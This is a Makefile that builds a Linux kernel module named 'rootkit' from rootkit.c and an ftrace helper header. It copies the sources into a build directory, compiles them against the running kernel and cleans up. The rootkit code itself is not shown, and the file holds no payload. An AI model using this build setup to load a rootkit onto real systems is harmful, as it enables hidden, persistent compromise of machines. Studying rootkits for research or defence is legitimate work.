obj-m += rootkit.o

all:
	cp $(PWD)/rootkit.c $(PWD)/build/
	cp $(PWD)/ftrace_helper.h $(PWD)/build/
	cp $(PWD)/Makefile $(PWD)/build/
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD)/build modules 
	rm $(PWD)/build/rootkit.c
	rm $(PWD)/build/ftrace_helper.h
	rm $(PWD)/build/Makefile

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD)/build clean